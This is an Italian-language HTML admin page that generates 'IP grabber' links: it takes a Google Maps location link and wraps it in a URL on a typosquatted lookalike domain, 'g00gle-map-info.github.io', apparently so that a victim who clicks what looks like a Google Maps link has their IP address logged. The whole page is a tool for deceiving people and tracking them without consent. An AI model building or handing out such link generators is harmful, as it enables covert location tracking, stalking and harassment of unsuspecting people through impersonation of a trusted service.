<!DOCTYPE html>
<html lang="it">
<head>
  <meta charset="UTF-8">
  <title>Admin - Genera Link IP Grabber</title>
</head>
<body>
  <h2>Inserisci una posizione di Google Maps</h2>
  
  <label for="maps-link">Link di Google Maps (es. https://www.google.com/maps?q=45.4642,9.1900):</label><br>
  <input type="text" id="maps-link" placeholder="Es. https://www.google.com/maps?q=45.4642,9.1900"><br><br>
  
  <!-- Pulsante per generare il link -->
  <button onclick="generaLink()">Genera Link IP Grabber</button>
  
  <h3>Link IP Grabber</h3>
  <p id="link-output"></p>

  <script>
    // Funzione per generare il link di IP grabber
    function generaLink() {
      const mapsLink = document.getElementById('maps-link').value;
      
      // Verifica se il link di Google Maps Ã¨ valido
      if (!mapsLink.includes("https://www.google.com/maps?q=")) {
        alert("Per favore, inserisci un link valido di Google Maps.");
        return;
      }
      
      // Codifica il link per l'URL
      const grabberLink = "https://g00gle-map-info.github.io/?q=" + encodeURIComponent(mapsLink);
      
      // Mostra il link generato
      document.getElementById('link-output').textContent = grabberLink;
    }
  </script>
</body>
</html>
